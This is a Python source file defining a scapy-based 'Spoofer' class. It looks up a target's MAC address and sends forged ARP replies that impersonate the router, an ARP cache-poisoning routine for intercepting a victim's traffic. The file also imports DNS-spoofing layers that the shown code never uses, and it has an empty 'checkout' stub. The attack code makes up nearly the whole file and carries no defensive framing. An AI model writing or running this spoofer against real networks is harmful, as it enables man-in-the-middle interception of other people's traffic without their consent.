from typing import Dict, Optional, Any, TypedDict
import json
import time
from random import randint

from scapy.all import DNS, IP, sr1, send, sniff, srp, Packet, conf  # type: ignore
from scapy.layers.l2 import ARP, Ether  # type: ignore
from scapy.layers.inet import UDP  # type: ignore
from scapy.layers.dns import DNS, DNSQR, DNSRR  # type: ignore

from data.data_helper import record_entry

class PacketData(TypedDict):
    Time: str
    IP: str

# Configure scapy
conf.noenum.add(conf.route.resync)
conf.use_pcap = True
conf.use_dnet = False  # type: ignore
conf.netcache.resolve = False  # type: ignore

class Spoofer:
    """Class for handling network packet spoofing and manipulation."""

    def __init__(self, host_ip: str, target_ip: str, router_ip: str) -> None:
        """
        Input:  host_ip (str) - Host machine IP, target_ip (str) - Target machine IP,
                router_ip (str) - Router IP address
        Output: None
        Purpose: Initialize spoofer with network addresses
        Description: Sets up spoofer with necessary IP addresses and target MAC address
        """
        self.__ip = host_ip
        self.__target_ip = target_ip
        self.__router_ip = router_ip
        self.__target_mac = self.get_mac(target_ip)
        self.urls: Dict[str, str] = {}

    def checkout(self):
        pass
    
    def send_spoofed_packet(self) -> None:
        """
        Input: None
        Output: None
        Purpose: Send spoofed ARP packet
        Description: Creates and sends ARP packet pretending to be the router
        """
        packet = ARP(op=2,
                    hwdst=self.__target_mac,
                    pdst=self.__target_ip,
                    psrc=self.__router_ip)
        send(packet, verbose=False)


    def get_mac(self, ip: str) -> str:
        """
        Input: ip (str) - IP address to lookup
        Output: str - MAC address of the IP
        Purpose: Get MAC address for IP
        Description: Uses ARP to discover MAC address of given IP address
        """
        final_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        answer = srp(final_packet, timeout=2, verbose=False)[0]
        mac = answer[0][1].hwsrc
        return mac

    